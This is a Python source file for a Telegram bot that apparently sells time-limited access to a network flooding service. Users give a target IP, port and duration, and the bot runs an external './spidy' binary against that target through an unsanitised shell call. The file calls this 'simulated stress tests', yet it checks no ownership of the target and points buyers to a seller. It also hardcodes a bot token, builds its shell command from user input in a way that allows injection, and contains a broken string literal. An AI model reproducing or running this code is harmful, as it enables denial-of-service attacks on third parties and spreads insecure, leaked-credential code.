import telebot
import datetime
import random
import logging
import subprocess
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize the bot with your bot's API token
bot = telebot.TeleBot('8062201499:AAEj0Z13mMlJJF0NiHXKVWXtXFTfdyYhUyY')

# Admin user IDs (replace with your own admin IDs as strings)
admin_ids = ["6710024903"]

# File to store allowed user IDs with expiry dates
USER_FILE = "users.txt"

# Dictionary to store allowed users with expiry dates
allowed_users = {}

# Dictionary to store last attack times for each user
user_last_attack_time = {}

# Variable to manage admin add state
admin_add_state = {}

# Dictionary to store user navigation history (stack-based)
user_navigation_history = {}

# Read user IDs and expiry dates from the file
def read_users():
    users = {}
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    user_id, expiry_str = parts
                    expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    users[user_id] = expiry_date
    except FileNotFoundError:
        pass
    return users

# Write user IDs and expiry dates to the file
def write_users(users):
    with open(USER_FILE, "w") as file:
        for user_id, expiry_date in users.items():
            file.write(f"{user_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")

# Load users at startup
allowed_users = read_users()

# Function to create main reply markup with buttons
def create_main_reply_markup(user_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('🚀 𝐀𝐭𝐭𝐚𝐜𝐤 🚀'),
        KeyboardButton('ℹ️ 𝐌𝐲 𝐢𝐧𝐟𝐨'),
        KeyboardButton('📄 𝐒𝐡𝐨𝐰 𝐇𝐞𝐥𝐩𝐬'),
        KeyboardButton('🔑 𝐅𝐨𝐫 𝐀𝐜𝐜𝐞𝐬𝐬')
    )
    if user_id in admin_ids:
        markup.add(KeyboardButton('🔒 𝐀𝐝𝐦𝐢𝐧 𝐎𝐧𝐥𝐲'))
    return markup

# Function to create admin reply markup with add/remove buttons
def create_admin_reply_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('➕ 𝐀𝐝𝐝 𝐔𝐬𝐞𝐫'),
        KeyboardButton('➖ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫'),
        KeyboardButton('⬅️ 𝐁𝐚𝐜𝐤')
    )
    return markup

# Function to create duration selection markup
def create_duration_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('1 𝐃𝐚𝐲'),
        KeyboardButton('7 𝐃𝐚𝐲𝐬'),
        KeyboardButton('1 𝐌𝐨𝐧𝐭𝐡'),
        KeyboardButton('⬅️ 𝐁𝐚𝐜𝐤')
    )
    return markup

# Function to create dynamic user list for removal
def create_user_removal_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    for user_id in allowed_users:
        markup.add(KeyboardButton(user_id))
    markup.add(KeyboardButton('⬅️ 𝐁𝐚𝐜𝐤'))
    return markup

# Helper function to update user navigation history
def update_navigation_history(user_id, markup):
    if user_id not in user_navigation_history:
        user_navigation_history[user_id] = []
    user_navigation_history[user_id].append(markup)

# Helper function to get last navigation state
def get_last_navigation(user_id):
    if user_id in user_navigation_history and user_navigation_history[user_id]:
        return user_navigation_history[user_id].pop()
    return None

# Function to log commands (stub for logging, implement as needed)
def log_command(user_id, target, port, duration):
    # Add your logging logic here
    pass

# Function to handle the /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    markup = create_main_reply_markup(user_id)
    update_navigation_history(user_id, markup)
    bot.send_message(message.chat.id, ""╔══◇◆◇══╗\n"
        "   𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐁𝐎𝐓\n"
        "╚══◇◆◇══╝\n\n"
        "✨ 𝐇𝐞𝐥𝐥𝐨 𝐝𝐚𝐫𝐥𝐢𝐧𝐠, 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐒𝐲𝐬𝐭𝐞𝐦 𝐁𝐨𝐭!\n"
        "This bot is your gateway to launching simulated high-performance **network stress tests** using premium VPS power.\n\n"
        "𝐇𝐞𝐫𝐞'𝐬 𝐰𝐡𝐚𝐭 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐝𝐨:\n"
        "➤ 🚀 **Attack** – Run simulated tests on your target IP.\n"
        "➤ ℹ️ **My Info** – View your current access level, user ID, and expiry.\n"
        "➤ 📄 **Show Helps** – Get full command list and usage format.\n"
        "➤ 🔑 **For Access** – Contact owner to get access.\n\n", reply_markup=markup)

# Handle "My Info" button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ 𝐌𝐲 𝐢𝐧𝐟𝐨')
def my_info_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "𝐍𝐨 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞"
    role = "𝐀𝐝𝐦𝐢𝐧" if user_id in admin_ids else "𝐔𝐬𝐞𝐫"
    
    if user_id in allowed_users:
        expiry_date = allowed_users[user_id]
        response = (f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 👤\n\n"
                    f"🔖 𝐑𝐨𝐥𝐞: {role}\n"
                    f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {user_id}\n"
                    f"👤 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n"
                    f"📅 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
    else:
        response = (f"👤 𝐔𝐬𝐞𝐫 𝐢𝐧𝐟𝐨 👤\n\n"
                    f"🔖 𝐑𝐨𝐥𝐞: {role}\n"
                    f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {user_id}\n"
                    f"👤 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n"
                    f"⚠️ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: 𝐍𝐨𝐭 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞\n")
    
    bot.reply_to(message, response)

# Handle attack command
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:
        try:
            parts = message.text.split()[1:]  # Ignore the command part
            if len(parts) == 3:
                target_ip, target_port, duration = parts[0], int(parts[1]), int(parts[2])

                if duration > 300:
                    bot.reply_to(message, "𝙉𝙤 𝙉𝙤 𝙉𝙤 𝙊𝙣𝙡𝙮 300.")
                    return

                # Handle cooldown for non-admin users
                current_time = datetime.datetime.now()
                if user_id in user_last_attack_time:
                    last_attack_time = user_last_attack_time[user_id]
                    time_since_last_attack = (current_time - last_attack_time).total_seconds()
                    if user_id not in admin_ids and time_since_last_attack < 10:
                        cooldown_time = int(10 - time_since_last_attack)
                        bot.reply_to(message, f"𝙔𝙤𝙪𝙧 𝙒𝙖𝙞𝙩 𝙄𝙨 𝙊𝙫𝙚𝙧 𝙉𝙤𝙬 𝘼𝙩𝙩𝙖𝙘𝙠 𝘼𝙜𝙖𝙞𝙣{cooldown_time} seconds.")
                        return

                user_last_attack_time[user_id] = current_time

                bot.reply_to(message, "𝘼𝙩𝙩𝙖𝙘𝙠 𝙄𝙨 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙋𝙧𝙤𝙥𝙚𝙧𝙡𝙮 𝘾𝙝𝙚𝙘𝙠 𝙋𝙞𝙣𝙜")
                bot.reply_to(message, f"🚀𝘈𝘵𝘵𝘢𝘤𝘬 𝘚𝘵𝘢𝘳𝘵𝘦𝘥 𝘗𝘦𝘳𝘧𝘦𝘤𝘵 🚀\n\n 𝘛𝘢𝘳𝘨𝘦𝘵 𝘐𝘱: {target_ip}, \n𝘗𝘰𝘳𝘵: {target_port}, \n𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯𝘴: {duration}")

                log_command(user_id, target_ip, target_port, duration)

                # Simulate the attack command (replace with actual command if needed)
                full_command = f"./spidy {target_ip} {target_port} {duration}"
                subprocess.run(full_command, shell=True)

                bot.reply_to(message, f"🚀𝘈𝘵𝘵𝘢𝘤𝘬 𝘪𝘴 𝘖𝘷𝘦𝘳 𝘕𝘰𝘸 𝘛𝘩𝘢𝘯𝘬𝘴 𝘍𝘰𝘳 𝘜𝘴𝘪𝘯𝘨.🚀 \n\n𝘛𝘢𝘳𝘨𝘦𝘵: {target_ip}\n𝘗𝘰𝘳𝘵: {target_port}\n𝘛𝘪𝘮𝘦: {duration}")
            else:
                bot.reply_to(message, "𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘊𝘰𝘮𝘮𝘢𝘥𝘴 𝘈𝘯𝘥 𝘔𝘴𝘨 𝘜𝘴𝘢𝘨𝘦: /attack <𝘐𝘱> <𝘗𝘰𝘳𝘵> <𝘚𝘦𝘤𝘰𝘯𝘥𝘴>")
        except ValueError:
            bot.reply_to(message, "𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘊𝘰𝘮𝘮𝘢𝘥 𝘍𝘰𝘳𝘮𝘦𝘵 𝘗𝘰𝘳𝘵 𝘈𝘯𝘥 𝘵𝘪𝘮𝘦 𝘮𝘶𝘴𝘵 𝘣𝘦 𝘊𝘩𝘦𝘤𝘬.")
    else:
        bot.reply_to(message, "𝘕𝘰 𝘠𝘰𝘶 𝘊𝘢𝘯 𝘕𝘪𝘵 𝘋𝘰 𝘵𝘩𝘪𝘴 𝘔𝘺 𝘚𝘰𝘯")

# Handle "Attack" button
@bot.message_handler(func=lambda message: message.text == '🚀 𝐀𝐭𝐭𝐚𝐜𝐤 🚀')
def prompt_attack_command(message):
    bot.reply_to(message, "𝘕𝘰𝘸 𝘜𝘴𝘦 𝘛𝘩𝘪𝘴 𝘊𝘰𝘮𝘮𝘢𝘥𝘴 𝘍𝘰𝘳 𝘈𝘵𝘵𝘢𝘤𝘬: /attack <𝘐𝘭> <𝘱𝘰𝘳𝘵> <𝘚𝘦𝘤𝘰𝘯𝘥𝘴>")

# Handle "Show Help" button
@bot.message_handler(func=lambda message: message.text == '📄 𝐒𝐡𝐨𝐰 𝐇𝐞𝐥𝐩𝐬')
def send_help_text(message):
    help_text = '''𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙁𝙤𝙧 𝙐𝙨𝙚𝙧𝙨:
- 🚀 𝐀𝐭𝐭𝐚𝐜𝐤 🚀: /attack Ip port Time.
- ℹ️ 𝐌𝐲 𝐢𝐧𝐟𝐨: Vɪᴇᴡ Yᴏᴜʀ Iɴғᴏʀᴍᴀᴛɪᴏɴs.
-  Dɪʀᴇᴄᴛ Msɢ : @SPIDY_OWNEROP
'''
    bot.send_message(message.chat.id, help_text)

# Handle "For Access" button
@bot.message_handler(func=lambda message: message.text == '🔑 𝐅𝐨𝐫 𝐀𝐜𝐜𝐞𝐬𝐬')
def send_access_text(message):
    access_text = 'Bᴏᴛ Oᴡɴᴇʀ Fᴏʀ Sᴇʟʟɪɴɢ @SPIDY_OWNEROP'
    bot.send_message(message.chat.id, access_text)

# Handle "Admin Only" button
@bot.message_handler(func=lambda message: message.text == '🔒 𝐀𝐝𝐦𝐢𝐧 𝐎𝐧𝐥𝐲')
def admin_only_menu(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_admin_reply_markup()
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮:", reply_markup=markup)
    else:
        bot.reply_to(message, "Yᴏᴜ Cᴀɴ Nᴏᴛ Dᴏ Tʜɪs Mʏ Sᴏɴ.")

# Handle "Add User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➕ 𝐀𝐝𝐝 𝐔𝐬𝐞𝐫')
def add_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_duration_markup()
        admin_add_state[user_id] = {'step': 'select_duration'}
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "Sᴇʟᴇᴄᴛ Tʜᴇ Aᴄᴄᴇss Iɴ Dᴜʀᴀᴛɪᴏɴs Fᴏʀ Tʜᴇ Nᴇᴡ Usᴇʀs", reply_markup=markup)
    else:
        bot.reply_to(message, "Yᴏᴜ Cᴀɴ Nᴏᴛ Dᴏ ᴛʜɪs.")

# Handle duration selection for adding a user
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'select_duration')
def select_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids and message.text in ['1 𝐃𝐚𝐲', '7 𝐃𝐚𝐲𝐬', '1 𝐌𝐨𝐧𝐭𝐡']:
        duration = message.text
        admin_add_state[user_id] = {'step': 'enter_user_id', 'duration': duration}
        bot.send_message(message.chat.id, f"𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 '{duration}' 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝. 𝐍𝐨𝐰, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐚𝐝𝐝:")
    else:
        bot.reply_to(message, "𝐈𝐧𝐯𝐚𝐢𝐥𝐞𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝 𝐨𝐫 𝐮𝐧𝐨𝐭𝐡𝐚𝐫𝐢𝐞𝐬𝐝 𝐚𝐜𝐭𝐢𝐨𝐧.")

# Handle user ID input after selecting duration
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'enter_user_id')
def add_user_after_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        new_user_id = message.text.strip()
        duration = admin_add_state[user_id]['duration']

        # Calculate expiry date based on the selected duration
        if duration == '1 𝐃𝐚𝐲':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=1)
        elif duration == '7 𝐃𝐚𝐲𝐬':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=7)
        elif duration == '1 𝐌𝐨𝐧𝐭𝐡':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=30)

        # Add the new user with the selected expiry date
        allowed_users[new_user_id] = expiry_date
        write_users(allowed_users)

        # Clear the admin state for this user
        del admin_add_state[user_id]

        bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {new_user_id} ᴜsᴇʀ Aᴅᴅ Wɪᴛʜ Aᴄᴄᴇss  {duration}.")
    else:
        bot.reply_to(message, "Yᴏᴜ Cᴀɴ ɴᴏᴛ Dᴏ ᴛʜɪs .")

# Handle "Remove User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➖ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫')
def remove_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if allowed_users:
            markup = create_user_removal_markup()
            update_navigation_history(user_id, markup)
            bot.send_message(message.chat.id, "𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞:", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞.")
    else:
        bot.reply_to(message, "Yᴏᴜ ᴄᴀɴ Nᴏᴛ Dᴏ ᴛʜɪs")

# Handle dynamic user removal
@bot.message_handler(func=lambda message: message.text in allowed_users)
def remove_user_dynamic(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        user_to_remove = message.text
        if user_to_remove in allowed_users:
            del allowed_users[user_to_remove]
            write_users(allowed_users)
            bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {user_to_remove} Rᴇᴍᴏᴠᴇᴅ 100%.")
            
            # Show updated list or go back to admin menu if empty
            if allowed_users:
                markup = create_user_removal_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "Sᴇʟᴇᴄᴛ Aɴɪᴛʜᴇʀ Usᴇʀs Tᴏ Rᴇᴍɪᴠᴇ", reply_markup=markup)
            else:
                markup = create_admin_reply_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "Nᴏ Mᴏʀᴇ Usᴇʀs BᴀCᴋ ᴛᴏ Mᴇɴᴜ:", reply_markup=markup)
        else:
            bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")
    else:
        bot.reply_to(message, "Yᴏᴜ Cᴀɴ Nᴏᴛ Dᴏ Tʜɪs Mʏ Sᴏɴ.")

# Handle "Back" button
@bot.message_handler(func=lambda message: message.text == '⬅️ 𝐁𝐚𝐜𝐤')
def back_to_last_menu(message):
    user_id = str(message.chat.id)
    last_markup = get_last_navigation(user_id)
    if last_markup:
        bot.send_message(message.chat.id, "𝐁𝐚𝐜𝐤 𝐭𝐨 𝐩𝐫𝐞𝐯𝐨𝐢𝐮𝐬 𝐦𝐞𝐧𝐮:", reply_markup=last_markup)
    else:
        markup = create_main_reply_markup(user_id)
        bot.send_message(message.chat.id, "𝐁𝐚𝐜𝐤 𝐭𝐨 𝐦𝐚𝐢𝐧 𝐦𝐞𝐧𝐮:", reply_markup=markup)

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
